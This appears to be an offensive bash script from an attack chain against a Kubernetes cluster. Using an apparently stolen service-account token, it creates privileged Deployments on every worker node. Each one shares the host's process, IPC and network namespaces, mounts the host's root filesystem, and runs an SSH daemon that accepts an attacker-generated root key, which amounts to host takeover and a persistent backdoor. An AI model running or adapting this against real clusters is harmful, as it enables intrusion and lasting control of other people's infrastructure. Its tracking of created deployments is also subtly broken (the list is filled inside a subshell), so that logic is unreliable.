#!/usr/bin/env bash
set -euo pipefail

NAMESPACE="$LOG_NS"
KUBE_APISERVER="https://$(dig +short $CONTROL_PLANE_NODE A):$CONTROL_PLANE_PORT"
TOKEN="$(cat $DATA_PATH/KC5/found_token)"
FILE_IP="/tmp/iphost"
WAIT_TIMEOUT="1800"

KEY_DIR="$DATA_PATH/KC5/ssh"
KEY_NAME="ssh-key"
PRIV_KEY="${KEY_DIR}/${KEY_NAME}"
PUB_KEY="${PRIV_KEY}.pub"

curl_common=(
  -sSk
  -H "Authorization: Bearer ${TOKEN}"
  -H "Content-Type: application/json"
)

api_get()   { curl "${curl_common[@]}" -X GET  "${KUBE_APISERVER}$1"; }
api_post()  { curl "${curl_common[@]}" -X POST -d @"$2" "${KUBE_APISERVER}$1"; }
api_put()   { curl "${curl_common[@]}" -X PUT  -d @"$2" "${KUBE_APISERVER}$1"; }

echo ">> Verify reachability API server..."
api_get "/version" >/dev/null || { echo "Impossible to reach API server. Watch KUBE_APISERVER/TOKEN/CA."; exit 1; }

list_node_ips() {
  if [[ ! -f "$FILE_IP" ]]; then
    echo "Error: file '$FILE_IP' not found" >&2
    return 1
  fi

  echo ">> Recover IPs list (file: $FILE_IP)..." >&2
  awk -F'-' '
    /^[[:space:]]*#/ { next }
    /^[[:space:]]*$/ { next }
    NF >= 2 {
      ip=$1; host=$2
      gsub(/^[ \t]+|[ \t\r]+$/, "", ip)
      gsub(/^[ \t]+|[ \t\r]+$/, "", host)
      if (host ~ /^worker([0-9]+)?$/ && ip ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) {
        print ip
      }
    }
  ' "$FILE_IP" | sort -u
}

make_deployment_json() {
  local iteration="$1"
  local name="node-controller-$iteration"
  created_names+=$name

  jq -n \
    --arg ns "${NAMESPACE}" \
    --arg name "${name}" \
    --arg sshPort "2222" \
    --arg app "ultra-priv" \
    --arg node "${node_host}" \
    --arg pub "${PUB_CONTENT}" \
    --arg cmd '
set -e
apk add --no-cache openssh bash curl jq iproute2 iptables psmisc procps cronie ca-certificates containerd unzip
mkdir -p /etc/ssh /run/sshd
ssh-keygen -A
mkdir -p /root/.ssh
printf "%s\n" "$AUTH_KEY" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
mkdir -p /etc/ssh/sshd_config.d
cat >/etc/ssh/sshd_config.d/99-runtime.conf <<'"'"'EOF'"'"'
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin prohibit-password
UseDNS no
EOF
exec /usr/sbin/sshd -D -e -p ${SSH_PORT}
' \
'{
  "apiVersion":"apps/v1",
  "kind":"Deployment",
  "metadata":{"name":$name,"namespace":$ns},
  "spec":{
    "replicas":1,
    "selector":{"matchLabels":{"app":$app,"target-node":$node}},
    "template":{
      "metadata":{"labels":{"app":$app,"target-node":$node}},
      "spec":{
        "hostPID": true,
        "hostIPC": true,
        "hostNetwork": true,
        "dnsPolicy": "ClusterFirstWithHostNet",
        "containers":[
          {
            "name":"agent",
            "image": "alpine:3.20",
            "securityContext":{
              "privileged":true,
              "allowPrivilegeEscalation":true
            },
            "ports":[{"containerPort": ($sshPort|tonumber), "name":"ssh"}],
            "env":[
              {"name":"SSH_PORT","value":$sshPort},
              {"name":"AUTH_KEY","value":$pub}
            ],
            "command":["sh","-c"],
            "args":[ $cmd ],
            "volumeMounts":[{"name":"host-root","mountPath":"/host","readOnly":false}]
          }
        ],
        "volumes":[{"name":"host-root","hostPath":{"path":"/","type":"Directory"}}]
      }
    }
  }
}
'
}

wait_deployment_ready() {
  local name="$1"
  local timeout="${2:-$WAIT_TIMEOUT}"
  local interval=5
  local start_ts now ready replicas observed gen

  echo ">> Waiting for Deployment '$name' to be ready (timeout: ${timeout}s)..."
  start_ts="$(date +%s)"

  while :; do
    # Fetch deployment status
    dep_json="$(api_get "/apis/apps/v1/namespaces/${NAMESPACE}/deployments/${name}")" || true
    # If it doesn't exist yet, keep waiting
    if [[ -z "$dep_json" || "$dep_json" == "Not Found" ]]; then
      :
    else
      ready="$(jq -r '.status.readyReplicas // 0' <<<"$dep_json")"
      replicas="$(jq -r '.spec.replicas // 1' <<<"$dep_json")"
      observed="$(jq -r '.status.observedGeneration // 0' <<<"$dep_json")"
      gen="$(jq -r '.metadata.generation // 0' <<<"$dep_json")"

      if [[ "$observed" -ge "$gen" && "$ready" -ge "$replicas" ]]; then
        echo "   -> Ready (${ready}/${replicas})"
        return 0
      fi
    fi

    now="$(date +%s)"
    if (( now - start_ts >= timeout )); then
      echo "!! Timed out waiting for deployment '$name' to be ready" >&2
      # Optional: show a brief diagnostic
      if [[ -n "${dep_json:-}" ]]; then
        echo "   Last known status:" >&2
        echo "   observedGeneration=$observed generation=$gen readyReplicas=$ready replicas=$replicas" >&2
        # Try to show pod phases (best-effort)
        # URL-encode the label selector: app=ultra-priv,target-node=<node> (we don't have node here; this is just best-effort)
      fi
      return 1
    fi
    sleep "$interval"
  done
}

create_deployment_for_node() {
  local node_host="$1"
  local iteration="$2"
  payload=$(make_deployment_json "${iteration}")
  tmpfile=$(mktemp)
  echo "${payload}" > "${tmpfile}"
  echo ">> Create Deployment for node '${node_host}'..."
  api_post "/apis/apps/v1/namespaces/${NAMESPACE}/deployments" "${tmpfile}" >/dev/null
  rm -f "${tmpfile}"
}

mkdir -p ${KEY_DIR}
rm -f $PRIV_KEY $PUB_KEY
ssh-keygen -t ed25519 -N '' -f "${PRIV_KEY}" -C "ultra-priv" >/dev/null
PUB_CONTENT="$(cat "${PUB_KEY}")"
echo "[i] Key generated: ${PRIV_KEY} / ${PUB_KEY}"

mapfile -t nodes < <(list_node_ips | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"; exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"

# 1) CREATE ALL
declare -a created_names=()
i=1
for n in "${nodes[@]}"; do
  create_deployment_for_node "$n" "$i"
  i=$((i+1))
done
echo "Created deployments with full control on host"

# 2) WAIT FOR ALL
echo ">> Waiting for ${#created_names[@]} deployments to become ready..."
fail=0
for name in "${created_names[@]}"; do
  if ! wait_deployment_ready "$name"; then
    echo "!! Deployment '$name' failed to become ready within timeout" >&2
    fail=1
  fi
done

if (( fail )); then
  echo "One or more deployments did not become ready" >&2
  exit 1
fi

echo "All deployments are ready. Created deployments with full control on host"